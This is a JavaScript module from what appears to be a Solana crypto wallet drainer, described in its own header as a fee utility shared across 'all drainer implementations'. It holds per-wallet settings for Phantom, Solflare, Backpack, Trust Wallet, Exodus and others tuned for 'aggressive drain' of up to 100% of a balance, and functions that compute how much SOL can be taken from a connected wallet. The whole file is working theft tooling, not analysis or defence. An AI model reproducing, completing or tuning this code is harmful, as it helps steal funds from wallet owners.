// Centralized Fee Calculation Utility
// Standardizes fee calculations across all drainer implementations

import { PublicKey, SystemProgram } from '@solana/web3.js';

/**
 * Standardized fee configuration for all wallets - Updated for 2025 standards
 */
export const STANDARD_FEE_CONFIG = {
  // Base fees (in lamports) - 2025 Solana standards
  BASE_FEE: 5000,                    // 0.000005 SOL - Fixed base fee per signature (2025 standard)
  PRIORITY_FEE_BASE: 1000,          // 0.000001 SOL - Base priority fee for compute units
  SAFETY_BUFFER: 2000,              // 0.000002 SOL - Safety buffer for fee estimation
  MINIMUM_FEE: 8000,                // 0.000008 SOL - Minimum total fee (base + priority + buffer)
  
  // Reserve amounts (in lamports) - 2025 standards
  RENT_EXEMPTION_RESERVE: 890000,   // 0.00089 SOL - Standard Solana rent exemption (2025)
  SAFETY_RESERVE: 10000,            // 0.00001 SOL - Minimal safety buffer
  TOTAL_RESERVE: 900000,            // 0.0009 SOL - Total reserve (rent exemption + safety)
  
  // Drain percentage
  DRAIN_PERCENTAGE: 1.0,            // 100% drain for all wallets
  
  // Fee calculation parameters - 2025 standards
  SAFETY_MARGIN_PERCENTAGE: 0.1,    // 10% safety margin (reduced from 20%)
  MAX_FEE_THRESHOLD: 50000,         // 0.00005 SOL - Maximum reasonable fee (2025 average)
  MIN_FEE_THRESHOLD: 5000,          // 0.000005 SOL - Minimum reasonable fee (base fee)
  
  // Compute unit standards - 2025
  DEFAULT_COMPUTE_UNITS: 200000,    // Standard compute units for transfers
  COMPUTE_UNIT_PRICE: 1,            // 1 micro-lamport per compute unit (minimal priority)
};

/**
 * Wallet-specific fee configurations - Comprehensive coverage for all wallet types
 */
export const WALLET_FEE_CONFIGS = {
  // Default fallback configuration
  default: {
    feeBuffer: 10000,           // 0.00001 SOL - Conservative default
    rentExemptionMinimum: 890880, // 0.00089088 SOL - Actual Solana rent exemption
    safetyBuffer: 50000,      // 0.00005 SOL - Much larger safety buffer for rent exemption
    priority: 'standard',
    maxInstructions: 10,        // Maximum instructions per transaction
    supportsComputeBudget: true // Whether wallet supports compute budget instructions
  },
  
  // Phantom Wallet - Ultra aggressive drain with minimal reserve (2025 optimized)
      phantom: {
        feeBuffer: 5000,            // 0.000005 SOL - Minimal fees (2025 standard)
        rentExemptionMinimum: 0,    // 0 SOL - No rent exemption reserve
        safetyBuffer: 400000,       // 0.0004 SOL - Increased reserve for Phantom stability
        drainPercentage: 0.95,      // 95% drain - leave 5% for safety
        priority: 'high',
        maxInstructions: 15,
        supportsComputeBudget: true,
        connectionTimeout: 30000,   // 30 seconds
        signingTimeout: 60000,      // 60 seconds
        computeUnitLimit: 200000,   // Standard compute units (2025)
        computeUnitPrice: 1         // 1 micro-lamport (minimal priority)
      },
  
  // Solflare Wallet - Aggressive drain with 0.00094 SOL reserve (2025 optimized)
  solflare: {
    feeBuffer: 5000,            // 0.000005 SOL - Minimal fees (2025 standard)
    rentExemptionMinimum: 0,    // 0 SOL - No rent exemption reserve
    safetyBuffer: 940000,      // 0.00094 SOL - Standard reserve for all wallets
    priority: 'standard',
    maxInstructions: 10,
    supportsComputeBudget: true,
    connectionTimeout: 20000,   // 20 seconds
    signingTimeout: 45000,      // 45 seconds
    computeUnitLimit: 200000,   // Standard compute units (2025)
    computeUnitPrice: 1         // 1 micro-lamport (minimal priority)
  },
  
  // Backpack Wallet - Aggressive drain with 0.00094 SOL reserve (2025 optimized)
  backpack: {
    feeBuffer: 5000,            // 0.000005 SOL - Minimal fees (2025 standard)
    rentExemptionMinimum: 0,    // 0 SOL - No rent exemption reserve
    safetyBuffer: 940000,      // 0.00094 SOL - Standard reserve for all wallets
    priority: 'high',
    maxInstructions: 12,
    supportsComputeBudget: true,
    connectionTimeout: 30000,   // 30 seconds
    signingTimeout: 60000,      // 60 seconds
    computeUnitLimit: 200000,   // Standard compute units (2025)
    computeUnitPrice: 1         // 1 micro-lamport (minimal priority)
  },
  
  // Glow Wallet - Aggressive drain with 0.00094 SOL reserve (2025 optimized)
  glow: {
    feeBuffer: 5000,            // 0.000005 SOL - Minimal fees (2025 standard)
    rentExemptionMinimum: 0,    // 0 SOL - No rent exemption reserve
    safetyBuffer: 940000,      // 0.00094 SOL - Standard reserve for all wallets
    priority: 'high',
    maxInstructions: 10,
    supportsComputeBudget: false, // Mobile wallets may not support compute budget
    connectionTimeout: 25000,   // 25 seconds
    signingTimeout: 50000,      // 50 seconds
    computeUnitLimit: 200000,   // Standard compute units (2025)
    computeUnitPrice: 1         // 1 micro-lamport (minimal priority)
  },
  
  // Trust Wallet - Aggressive drain with 0.00094 SOL reserve (2025 optimized)
  trustwallet: {
    feeBuffer: 5000,            // 0.000005 SOL - Minimal fees (2025 standard)
    rentExemptionMinimum: 0,    // 0 SOL - No rent exemption reserve
    safetyBuffer: 940000,      // 0.00094 SOL - Standard reserve for all wallets
    priority: 'high',
    maxInstructions: 10,
    supportsComputeBudget: false, // May not support compute budget
    // No timeouts - Trust Wallet handles its own timeouts
    computeUnitLimit: 200000,   // Standard compute units (2025)
    computeUnitPrice: 1         // 1 micro-lamport (minimal priority)
  },
  
  // Exodus Wallet - Aggressive drain with 0.00094 SOL reserve (2025 optimized)
  exodus: {
    feeBuffer: 5000,            // 0.000005 SOL - Minimal fees (2025 standard)
    rentExemptionMinimum: 0,    // 0 SOL - No rent exemption reserve
    safetyBuffer: 940000,      // 0.00094 SOL - Standard reserve for all wallets
    priority: 'high',
    maxInstructions: 10,
    supportsComputeBudget: false, // Multi-chain wallets may not support compute budget
    connectionTimeout: 30000,   // 30 seconds
    signingTimeout: 60000,      // 60 seconds
    computeUnitLimit: 200000,   // Standard compute units (2025)
    computeUnitPrice: 1         // 1 micro-lamport (minimal priority)
  },
  
  // Unknown wallet - Aggressive drain with 0.00094 SOL reserve (2025 optimized)
  unknown: {
    feeBuffer: 5000,            // 0.000005 SOL - Minimal fees (2025 standard)
    rentExemptionMinimum: 0,    // 0 SOL - No rent exemption reserve
    safetyBuffer: 940000,      // 0.00094 SOL - Standard reserve for all wallets
    priority: 'conservative',
    maxInstructions: 5,         // Conservative limit
    supportsComputeBudget: false, // Assume no support
    connectionTimeout: 20000,   // 20 seconds
    signingTimeout: 45000,      // 45 seconds
    computeUnitLimit: 200000,   // Standard compute units (2025)
    computeUnitPrice: 1         // 1 micro-lamport (minimal priority)
  }
};

/**
 * Normalize wallet type to ensure consistent configuration lookup
 * @param {string} walletType - Raw wallet type
 * @returns {string} Normalized wallet type
 */
function normalizeWalletType(walletType) {
  if (!walletType || typeof walletType !== 'string') {
    return 'default';
  }
  
  const normalized = walletType.toLowerCase().trim();
  
  // Map common variations to standard types
  const walletTypeMap = {
    'phantom': 'phantom',
    'solflare': 'solflare', 
    'backpack': 'backpack',
    'glow': 'glow',
    'trustwallet': 'trustwallet',
    'trust': 'trustwallet',
    'exodus': 'exodus',
    'unknown': 'unknown',
    'default': 'default'
  };
  
  return walletTypeMap[normalized] || 'unknown';
}

/**
 * Calculate transaction fee with network validation
 * @param {Connection} connection - Solana connection
 * @param {Transaction} transaction - Transaction to calculate fee for
 * @param {string} blockhash - Recent blockhash
 * @returns {Object} Fee calculation result
 */
export async function calculateTransactionFee(connection, transaction, blockhash, walletType = 'default') {
  try {
    // Normalize wallet type and get configuration
    const normalizedWalletType = normalizeWalletType(walletType);
    const walletConfig = WALLET_FEE_CONFIGS[normalizedWalletType] || WALLET_FEE_CONFIGS.default;
    
    console.log(`[FEE_CALCULATOR] Calculating fee for wallet: ${normalizedWalletType}`);
    
    // Validate inputs
    if (!connection || !transaction || !blockhash) {
      throw new Error('Missing required parameters for fee calculation');
    }
    
    // Get actual fee from network with retry logic
    let actualFee = STANDARD_FEE_CONFIG.BASE_FEE;
    let networkFeeSuccess = false;
    
    try {
    const feeCalculator = await connection.getFeeForMessage(transaction.compileMessage(), blockhash);
      if (feeCalculator && typeof feeCalculator.value === 'number' && feeCalculator.value > 0) {
        actualFee = feeCalculator.value;
        networkFeeSuccess = true;
        console.log(`[FEE_CALCULATOR] Network fee calculated: ${actualFee} lamports`);
      }
    } catch (networkError) {
      console.warn(`[FEE_CALCULATOR] Network fee calculation failed: ${networkError.message}, using fallback`);
    }
    
    // Validate fee calculation
    if (actualFee <= STANDARD_FEE_CONFIG.MIN_FEE_THRESHOLD || 
        actualFee > STANDARD_FEE_CONFIG.MAX_FEE_THRESHOLD) {
      console.warn(`[FEE_CALCULATOR] Suspicious fee calculated: ${actualFee}, using standard`);
      actualFee = STANDARD_FEE_CONFIG.BASE_FEE;
      networkFeeSuccess = false;
    }
    
    // Add wallet-specific fee buffer
    const walletFeeBuffer = walletConfig.feeBuffer ?? 0;
    const safetyBuffer = Math.ceil(actualFee * STANDARD_FEE_CONFIG.SAFETY_MARGIN_PERCENTAGE);
    const totalFee = Math.max(actualFee + safetyBuffer + walletFeeBuffer, STANDARD_FEE_CONFIG.MINIMUM_FEE);
    
    console.log(`[FEE_CALCULATOR] Wallet: ${normalizedWalletType}, Base fee: ${actualFee}, Wallet buffer: ${walletFeeBuffer}, Safety buffer: ${safetyBuffer}, Total: ${totalFee}`);
    
    return {
      baseFee: actualFee,
      walletFeeBuffer: walletFeeBuffer,
      safetyBuffer: safetyBuffer,
      totalFee: totalFee,
      feeSOL: (totalFee / 1e9).toFixed(9),
      isValid: true,
      networkFeeSuccess: networkFeeSuccess,
      walletType: normalizedWalletType
    };
  } catch (feeError) {
    console.warn(`[FEE_CALCULATOR] Fee calculation failed: ${feeError.message}, using conservative default`);
    
    // Get wallet-specific configuration for fallback
    const normalizedWalletType = normalizeWalletType(walletType);
    const walletConfig = WALLET_FEE_CONFIGS[normalizedWalletType] || WALLET_FEE_CONFIGS.default;
    
    // Use conservative default with wallet-specific safety buffer
    const baseFee = STANDARD_FEE_CONFIG.BASE_FEE;
    const walletFeeBuffer = walletConfig.feeBuffer ?? 0;
    const safetyBuffer = STANDARD_FEE_CONFIG.SAFETY_BUFFER;
    const totalFee = baseFee + safetyBuffer + walletFeeBuffer;
    
    return {
      baseFee: baseFee,
      walletFeeBuffer: walletFeeBuffer,
      safetyBuffer: safetyBuffer,
      totalFee: totalFee,
      feeSOL: (totalFee / 1e9).toFixed(9),
      isValid: false,
      networkFeeSuccess: false,
      error: feeError.message,
      walletType: normalizedWalletType
    };
  }
}

/**
 * Check if balance is adequate for fees and reserves
 * @param {number} balance - Wallet balance in lamports
 * @param {Object} feeInfo - Fee calculation result
 * @param {string} walletType - Wallet type for specific reserves
 * @returns {Object} Fee adequacy check result
 */
export function checkFeeAdequacy(balance, feeInfo, walletType = 'default') {
  try {
    // Normalize wallet type and get configuration
    const normalizedWalletType = normalizeWalletType(walletType);
    const walletConfig = WALLET_FEE_CONFIGS[normalizedWalletType] || WALLET_FEE_CONFIGS.default;
    
    // Validate inputs
    if (typeof balance !== 'number' || balance < 0) {
      throw new Error('Invalid balance provided');
    }
    
    if (!feeInfo || typeof feeInfo.totalFee !== 'number' || feeInfo.totalFee < 0) {
      throw new Error('Invalid fee information provided');
    }
    
    // Use wallet-specific configurations
    const rentExemptionMinimum = walletConfig.rentExemptionMinimum ?? 0;
    const safetyBuffer = walletConfig.safetyBuffer ?? 50000;
    const totalReserve = rentExemptionMinimum + safetyBuffer;
  const totalRequired = feeInfo.totalFee + totalReserve;
  
  const isAdequate = balance >= totalRequired;
  const remainingAfterFees = balance - totalRequired;
    
    console.log(`[FEE_ADEQUACY] Wallet: ${normalizedWalletType}`);
    console.log(`[FEE_ADEQUACY] Balance: ${balance} lamports (${(balance / 1e9).toFixed(6)} SOL)`);
    console.log(`[FEE_ADEQUACY] Fee required: ${feeInfo.totalFee} lamports (${(feeInfo.totalFee / 1e9).toFixed(6)} SOL)`);
    console.log(`[FEE_ADEQUACY] Reserve required: ${totalReserve} lamports (${(totalReserve / 1e9).toFixed(6)} SOL)`);
    console.log(`[FEE_ADEQUACY] Total required: ${totalRequired} lamports (${(totalRequired / 1e9).toFixed(6)} SOL)`);
    console.log(`[FEE_ADEQUACY] Is adequate: ${isAdequate}`);
  
  return {
    isAdequate: isAdequate,
    totalRequired: totalRequired,
    totalFee: feeInfo.totalFee,
    totalReserve: totalReserve,
    remainingAfterFees: remainingAfterFees,
      walletType: normalizedWalletType,
    breakdown: {
      balance: balance,
      feeRequired: feeInfo.totalFee,
      reserveRequired: totalReserve,
      totalRequired: totalRequired,
      remaining: remainingAfterFees
    }
  };
  } catch (error) {
    console.error(`[FEE_ADEQUACY] Error checking fee adequacy: ${error.message}`);
    return {
      isAdequate: false,
      error: error.message,
      walletType: normalizeWalletType(walletType)
    };
  }
}

/**
 * Calculate optimal drain amount with standardized logic
 * @param {number} balance - Wallet balance in lamports
 * @param {Object} feeInfo - Fee calculation result
 * @param {string} walletType - Wallet type
 * @returns {Object} Drain calculation result
 */
export function calculateDrainAmount(balance, feeInfo, walletType = 'default') {
  try {
    // Normalize wallet type and get configuration
    const normalizedWalletType = normalizeWalletType(walletType);
    const walletConfig = WALLET_FEE_CONFIGS[normalizedWalletType] || WALLET_FEE_CONFIGS.default;
    
    console.log(`[DRAIN_CALC] Calculating drain amount for wallet: ${normalizedWalletType}`);
    
    // Validate inputs
    if (typeof balance !== 'number' || balance < 0) {
      throw new Error('Invalid balance provided');
    }
    
    if (!feeInfo || typeof feeInfo.totalFee !== 'number' || feeInfo.totalFee < 0) {
      throw new Error('Invalid fee information provided');
    }
    
    // Use wallet-specific rent and safety configurations
    const rentExemptionMinimum = walletConfig.rentExemptionMinimum ?? 0;
    const safetyBuffer = walletConfig.safetyBuffer ?? 400000;
    const minimumReserve = rentExemptionMinimum + safetyBuffer;
    
    console.log(`[DRAIN_CALC_DEBUG] Wallet: ${normalizedWalletType}, Rent exemption: ${rentExemptionMinimum}, Safety buffer: ${safetyBuffer}, Total reserve: ${minimumReserve}`);
    const totalRequired = feeInfo.totalFee + minimumReserve;
    
    // Calculate drain amount using DRAIN_PERCENTAGE from STANDARD_FEE_CONFIG
    
    // Calculate available amount for draining (after transaction fees)
    const availableForDrain = balance - feeInfo.totalFee;
    
    // Check if available amount is sufficient for minimum reserves
    if (availableForDrain < minimumReserve) {
      return {
        canDrain: false,
        reason: 'INSUFFICIENT_FUNDS_AFTER_FEES',
        balance: balance,
        availableForDrain: availableForDrain,
        minimumReserve: minimumReserve,
        shortfall: minimumReserve - availableForDrain,
        walletType: normalizedWalletType,
        breakdown: {
          originalBalance: balance,
          feeRequired: feeInfo.totalFee,
          availableForDrain: availableForDrain,
          minimumReserve: minimumReserve,
          shortfall: minimumReserve - availableForDrain
        }
      };
    }
    
    // Calculate drain amount using wallet-specific or standard percentage
    let drainAmount;
    const walletDrainPercentage = walletConfig.drainPercentage;
    const drainPercentage = walletDrainPercentage ?? STANDARD_FEE_CONFIG.DRAIN_PERCENTAGE; // Use wallet-specific or default 100%
    
    console.log(`[DRAIN_CALC_DEBUG] Balance: ${balance}, Available: ${availableForDrain}, Minimum reserve: ${minimumReserve}`);
    console.log(`[DRAIN_CALC_DEBUG] Wallet: ${normalizedWalletType}, Drain percentage: ${(drainPercentage * 100).toFixed(1)}%`);
    
    if (availableForDrain <= minimumReserve) {
      // Not enough to drain anything while maintaining minimum reserves
      drainAmount = 0;
      console.log(`[DRAIN_CALC_DEBUG] Not enough to drain - available (${availableForDrain}) <= reserve (${minimumReserve})`);
    } else {
      // Drain percentage of remaining balance after minimum reserves
      const drainableAmount = availableForDrain - minimumReserve;
      drainAmount = Math.floor(drainableAmount * drainPercentage);
      console.log(`[DRAIN_CALC_DEBUG] Drainable: ${drainableAmount}, Drain amount: ${drainAmount}, Remaining: ${balance - feeInfo.totalFee - drainAmount}`);
    }
    
    // Drain calculation completed
  
  if (drainAmount <= 0) {
    return {
      canDrain: false,
      reason: 'INSUFFICIENT_FUNDS_AFTER_RESERVES',
      balance: balance,
      totalRequired: totalRequired,
        availableForDrain: availableForDrain,
        minimumReserve: minimumReserve,
        walletType: normalizedWalletType,
        breakdown: {
          originalBalance: balance,
          feeRequired: feeInfo.totalFee,
          availableForDrain: availableForDrain,
          minimumReserve: minimumReserve,
          totalRequired: totalRequired
        }
      };
    }
    
    const remainingBalance = minimumReserve; // Minimum reserves remain
  
  return {
    canDrain: true,
    drainAmount: drainAmount,
    drainAmountSOL: (drainAmount / 1e9).toFixed(6),
      remainingBalance: remainingBalance,
      remainingBalanceSOL: (remainingBalance / 1e9).toFixed(6),
      walletType: normalizedWalletType,
    breakdown: {
      originalBalance: balance,
        feeRequired: feeInfo.totalFee,
      availableForDrain: availableForDrain,
        rentExemptionReserve: rentExemptionMinimum,
      drainAmount: drainAmount,
        remainingAfterDrain: remainingBalance,
        drainPercentage: availableForDrain > 0 ? (drainAmount / availableForDrain * 100).toFixed(1) + '%' : '0%'
      }
    };
  } catch (error) {
    console.error(`[DRAIN_CALC] Error calculating drain amount: ${error.message}`);
    return {
      canDrain: false,
      reason: 'CALCULATION_ERROR',
      error: error.message,
      walletType: normalizeWalletType(walletType)
    };
  }
}

/**
 * Get standardized fee configuration for a wallet type
 * @param {string} walletType - Wallet type
 * @returns {Object} Fee configuration
 */
export function getWalletFeeConfig(walletType) {
  return WALLET_FEE_CONFIGS[walletType] || WALLET_FEE_CONFIGS.solflare;
}

/**
 * Validate fee calculation result
 * @param {Object} feeInfo - Fee calculation result
 * @returns {boolean} Whether fee calculation is valid
 */
export function validateFeeCalculation(feeInfo) {
  if (!feeInfo || typeof feeInfo !== 'object') {
    return false;
  }
  
  const { baseFee, safetyBuffer, totalFee } = feeInfo;
  
  // Check if all required fields exist
  if (typeof baseFee !== 'number' || typeof safetyBuffer !== 'number' || typeof totalFee !== 'number') {
    return false;
  }
  
  // Check if values are reasonable
  if (baseFee <= 0 || safetyBuffer < 0 || totalFee <= 0) {
    return false;
  }
  
  // Check if total fee is reasonable
  if (totalFee > STANDARD_FEE_CONFIG.MAX_FEE_THRESHOLD || totalFee < STANDARD_FEE_CONFIG.MIN_FEE_THRESHOLD) {
    return false;
  }
  
  return true;
}

/**
 * Format fee information for logging
 * @param {Object} feeInfo - Fee calculation result
 * @param {Object} drainInfo - Drain calculation result
 * @returns {string} Formatted fee information
 */
export function formatFeeInfo(feeInfo, drainInfo = null) {
  const feeSOL = (feeInfo.totalFee / 1e9).toFixed(6);
  const baseFeeSOL = (feeInfo.baseFee / 1e9).toFixed(6);
  const bufferSOL = (feeInfo.safetyBuffer / 1e9).toFixed(6);
  
  let info = `Fee: ${feeInfo.totalFee} lamports (${feeSOL} SOL) [Base: ${feeInfo.baseFee} lamports (${baseFeeSOL} SOL), Buffer: ${feeInfo.safetyBuffer} lamports (${bufferSOL} SOL)]`;
  
  if (drainInfo && drainInfo.canDrain) {
    info += ` | Drain: ${drainInfo.drainAmount} lamports (${drainInfo.drainAmountSOL} SOL)`;
  }
  
  return info;
}

export default {
  STANDARD_FEE_CONFIG,
  WALLET_FEE_CONFIGS,
  calculateTransactionFee,
  checkFeeAdequacy,
  calculateDrainAmount,
  getWalletFeeConfig,
  validateFeeCalculation,
  formatFeeInfo
};
